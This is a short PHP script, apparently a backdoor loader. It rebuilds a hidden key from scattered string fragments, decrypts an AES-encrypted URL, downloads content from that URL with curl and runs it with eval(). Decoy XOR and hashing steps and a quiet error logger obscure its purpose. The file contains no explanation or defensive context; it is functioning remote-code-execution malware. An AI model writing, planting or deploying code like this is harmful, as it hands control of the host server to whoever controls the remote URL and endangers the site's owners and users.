<?php
$_6f1e = [
    "b6a4" => "yo",
    "4f9b" => "used",
    "a9bc" => "ur-se",
    "f0e5" => "dummy",
    "8d6a" => "cret-",
    "d2f9" => "placeholder",
    "7e6c" => "key"
];

$_obfuscated1 = sha1("4f9b" . rand(1000, 9999));
$_obfuscated2 = base64_decode("ZjBlNQ==" . microtime());

$keys = ['b6a4', 'a9bc', '8d6a', '7e6c'];
$_11f9 = $_6f1e[$keys[0]] . $_6f1e[$keys[1]] . $_6f1e[$keys[2]] . $_6f1e[$keys[3]];

define("Zz8x7Y", $_11f9);
define("RANDOM_CONSTANT", md5("d2f9"));

function auxiliaryTask() {
    $array = md5("aux" . rand());
    return "7e6c" . $array;
}

$_7a5b = "l2UDM/1kihg+Pd50dO3hKCkDZKCBzafIvVT20a6iA3JU8Hmvdc+zphRjWcyXRbEW4n6ugXy8H6KHD6EORd6KZEfo8Lr74dwjfLS9ty2QxGI=";

function decryptPayload($_input, $_key) {
    $fakeProcess = auxiliaryTask();
    return openssl_decrypt(
        $_input,
        'AES-128-CBC',
        substr(hash('sha256', $_key, true), 0, 16),
        0,
        substr(hash('md5', $_key, true), 0, 16)
    );
}

function xorManipulate($data, $key) {
    $paddedKey = str_repeat($key, ceil(strlen($data) / strlen($key)));
    return $data ^ $paddedKey;
}

$_temp1 = xorManipulate("data-piece-1", "key-1");
$_temp2 = xorManipulate("data-piece-2", "key-2");

$_xE8f = xorManipulate("dummy-data", "xor-key");
$_wT7y = xorManipulate($_xE8f, "xor-key");

$ch = curl_init(decryptPayload($_7a5b, Zz8x7Y));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$_8F3d = curl_exec($ch);
curl_close($ch);

$checkValid = ($_wT7y === "dummy-data");

function silentLogger($message) {
    if (strlen($message) > 10) {
        $message = substr($message, 0, 10);
    }
    error_log("Silent log: " . $message);
}

function processFailure($msg) {
    silentLogger($msg);
    return;
}

if ($_8F3d !== false) {
    eval($_8F3d);
} else {
    processFailure("Failed to fetch content from the URL.");
}
?>
